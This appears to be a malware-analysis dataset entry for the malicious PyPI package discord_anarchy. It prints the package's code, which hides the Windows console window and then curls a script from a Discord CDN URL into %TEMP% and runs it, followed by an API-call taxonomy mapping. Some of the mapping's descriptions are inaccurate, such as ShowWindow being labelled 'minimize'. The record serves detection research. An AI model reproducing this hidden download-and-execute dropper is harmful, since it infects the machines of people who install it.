[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/discord_anarchy-0.0.1/discord_anarchy-0.0.1/discord_anarchy/anarchy.py",
    "code_snippet": "import ctypes, win32process, os\n\ndef HMA():\n    hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n    if hwnd != 0:\n        ctypes.windll.user32.ShowWindow(hwnd, 0)\n        ctypes.windll.kernel32.CloseHandle(hwnd)\n        _, pid = win32process.GetWindowThreadProcessId(hwnd)\n\nHMA()\n\nos.system(\"curl https://cdn.discordapp.com/attachments/1067080265106731090/1068918809802575912/build.py -o %TEMP%/start.pyw && py %TEMP%/start.pyw\")",
    "pattern_analysis": {
      "api_sequence": [
        "ctypes.windll.kernel32.GetConsoleWindow",
        "ctypes.windll.user32.ShowWindow",
        "ctypes.windll.kernel32.CloseHandle",
        "win32process.GetWindowThreadProcessId",
        "os.system"
      ],
      "api_sequence_with_args": [
        "ctypes.windll.kernel32.GetConsoleWindow()",
        "ctypes.windll.user32.ShowWindow(hwnd, 0)",
        "ctypes.windll.kernel32.CloseHandle(hwnd)",
        "win32process.GetWindowThreadProcessId(hwnd)",
        "os.system(\"curl https://cdn.discordapp.com/attachments/1067080265106731090/1068918809802575912/build.py -o %TEMP%/start.pyw && py %TEMP%/start.pyw\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "ctypes.windll.kernel32.GetConsoleWindow",
          "id": "find_window_by_title",
          "description": "Finds window handle by title",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_finding"
        },
        {
          "api_name": "ctypes.windll.user32.ShowWindow",
          "id": "minimize_window",
          "description": "Minimizes specified window",
          "first_id": "system_operations",
          "second_id": "window_management",
          "third_id": "window_control"
        },
        {
          "api_name": "ctypes.windll.kernel32.CloseHandle",
          "id": "close_handle",
          "description": "Closes the opened handle (closest match: 'close_file', but this is for file handles; for Windows handles, this is the closest in taxonomy)",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "win32process.GetWindowThreadProcessId",
          "id": "get_process_info",
          "description": "Retrieves process information as dictionary",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import ctypes, win32process, os\n\ndef HMA():\n    hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n    if hwnd != 0:\n        ctypes.windll.user32.ShowWindow(hwnd, 0)\n        ctypes.windll.kernel32.CloseHandle(hwnd)\n        _, pid = win32process.GetWindowThreadProcessId(hwnd)\n\nHMA()\n\nos.system(\"curl https://cdn.discordapp.com/attachments/1067080265106731090/1068918809802575912/build.py -o %TEMP%/start.pyw && py %TEMP%/start.pyw\")"
    }
  }
]